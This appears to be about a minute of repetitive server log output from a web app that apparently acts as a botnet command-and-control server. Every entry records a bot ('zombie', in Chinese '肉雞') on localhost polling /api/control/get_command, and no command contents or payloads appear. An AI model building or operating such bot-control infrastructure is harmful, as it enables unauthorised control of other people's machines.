2025-06-25 00:25:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:46 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:47 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:48 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:49 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:50 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:51 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:52 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:53 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:54 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:55 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:56 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:57 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:58 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:59 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:00 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:01 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:02 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:03 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:04 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:05 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:06 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:07 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:08 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:09 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:10 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:11 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:12 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:13 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:14 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:15 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:16 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:17 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:18 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:19 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:20 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:21 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:22 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:23 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:24 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:25 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:26 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:27 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:28 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:29 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:30 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:31 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:32 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:33 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:34 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:35 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:36 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:37 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
